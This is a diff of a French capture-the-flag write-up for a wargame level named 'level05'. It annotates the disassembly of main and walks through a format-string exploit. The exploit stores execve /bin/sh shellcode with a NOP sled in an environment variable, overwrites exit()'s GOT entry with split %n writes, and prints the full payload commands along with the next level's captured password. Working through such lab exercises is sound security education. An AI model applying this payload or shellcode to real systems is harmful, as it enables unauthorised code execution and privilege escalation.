@@ -8,66 +8,111 @@ gdb level05
 set disassembly-flavor intel
 disas main
 Dump of assembler code for function main:
-   0x08048444 <+0>:	push   ebp
-   0x08048445 <+1>:	mov    ebp,esp
-   0x08048447 <+3>:	push   edi
-   0x08048448 <+4>:	push   ebx
-   0x08048449 <+5>:	and    esp,0xfffffff0
-   0x0804844c <+8>:	sub    esp,0x90
-   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
+   0x08048444 <+0>:		push   ebp
+   0x08048445 <+1>:		mov    ebp,esp
+   0x08048447 <+3>:		push   edi
+   0x08048448 <+4>:		push   ebx
+   0x08048449 <+5>:		and    esp,0xfffffff0
+   0x0804844c <+8>:		sub    esp,0x90
+   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0	// int i = 0
    0x0804845d <+25>:	mov    eax,ds:0x80497f0
    0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
-   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
+   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64	// char buf = 100
    0x0804846e <+42>:	lea    eax,[esp+0x28]
    0x08048472 <+46>:	mov    DWORD PTR [esp],eax
-   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
-   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
+   0x08048475 <+49>:	call   0x8048350 <fgets@plt>	// fgets(buf, 100, stdin)
+   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0 // i = 0
    0x08048485 <+65>:	jmp    0x80484d3 <main+143>
    0x08048487 <+67>:	lea    eax,[esp+0x28]
-   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
+   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]	// buf[i]
    0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
    0x08048495 <+81>:	cmp    al,0x40
-   0x08048497 <+83>:	jle    0x80484cb <main+135>
+   0x08048497 <+83>:	jle    0x80484cb <main+135>		// if (buf[i] <= 64) jump to +135
    0x08048499 <+85>:	lea    eax,[esp+0x28]
-   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
+   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]	// buf[i]
    0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
    0x080484a7 <+99>:	cmp    al,0x5a
-   0x080484a9 <+101>:	jg     0x80484cb <main+135>
+   0x080484a9 <+101>:	jg     0x80484cb <main+135>		// if (buf[i] > 90) jump to 135
    0x080484ab <+103>:	lea    eax,[esp+0x28]
-   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]	// buf[i]
    0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
    0x080484b9 <+117>:	mov    edx,eax
-   0x080484bb <+119>:	xor    edx,0x20
+   0x080484bb <+119>:	xor    edx,0x20					// XOR buf[i] , 0010 0000
    0x080484be <+122>:	lea    eax,[esp+0x28]
-   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]	// buf[i]
    0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
-   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
+   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1	// i++
    0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
-   0x080484da <+150>:	lea    eax,[esp+0x28]
+   0x080484da <+150>:	lea    eax,[esp+0x28]			// buf
    0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
    0x080484e6 <+162>:	mov    edx,eax
    0x080484e8 <+164>:	mov    eax,0x0
    0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
    0x080484f1 <+173>:	mov    edi,edx
-   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
+   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]	// strlen(buf)
    0x080484f5 <+177>:	mov    eax,ecx
    0x080484f7 <+179>:	not    eax
    0x080484f9 <+181>:	sub    eax,0x1
    0x080484fc <+184>:	cmp    ebx,eax
-   0x080484fe <+186>:	jb     0x8048487 <main+67>
+   0x080484fe <+186>:	jb     0x8048487 <main+67>	// while (i < strlen(buf))
    0x08048500 <+188>:	lea    eax,[esp+0x28]
    0x08048504 <+192>:	mov    DWORD PTR [esp],eax
-   0x08048507 <+195>:	call   0x8048340 <printf@plt>
+   0x08048507 <+195>:	call   0x8048340 <printf@plt>	// printf(buf)
    0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
-   0x08048513 <+207>:	call   0x8048370 <exit@plt>
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>	// exit(0)
+
+Le programme a un printf, on suppose qu'il faut utiliser la faille
+du string format.
+L'offset du string format est de 10.
+Nous allons réécrire l'adresse de exit() dans le GOT.
+Allons la chercher:
+
+info functions exit
+0x08048370  exit@plt
+x/i 0x08048370
+0x8048370 <exit@plt>:	jmp    *0x80497e0
+
+Maintenant nous allons faire une variable d'environnement contenant notre shellcode
+vu qu'il n'y a aucun appel à system() ou autre.
+
+export SHELLCODE=$(python -c 'print "\x90"*1000+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"')
+
+Cherchons maintenant l'adresse de notre env shellcode.
+env -i SHELLCODE=$(python -c 'print "\x90"*1000+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"') gdb level05
+gdb level05
+break main
+run
+x/200s environ
+On prend une adresse dans le NOP SLED: 0xffffde25
+
+Donc nous avons l'adresse à modifier qui est 0x80497e0 et l'adresse à utiliser 0xffffde25.
+
+Avec le padding de printf nous ne pouvons pas mettre 0xffffde25 en 1 fois.
+Il va falloir split l'adresse:
+\x25\xde = 56869          \xff\xff = 65535
+
+Construisons le payload:
+addr 1 +  -------- second part of shelladdr - first part
+\xe0\x97\x04\x08
+addr 2 +
+\xe2\x97\x04\x08
+first part of shelladdr - 8
+56869 - 8 = 56861
+second part of shelladdr - first part
+65535 - 56869 = 8666
 
 Exploitation du programme:
 --------------------------
+
+python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56861d%10$n"+"%8666d%11$n"' > /tmp/lvl05
+cat /tmp/lvl05 - | env -i SHELLCODE=$(python -c 'print "\x90"*1000+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"') ./level05
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 
 Connexion au level suivant:
 ---------------------------
 
 su level06
-3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
-
-BBBB %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
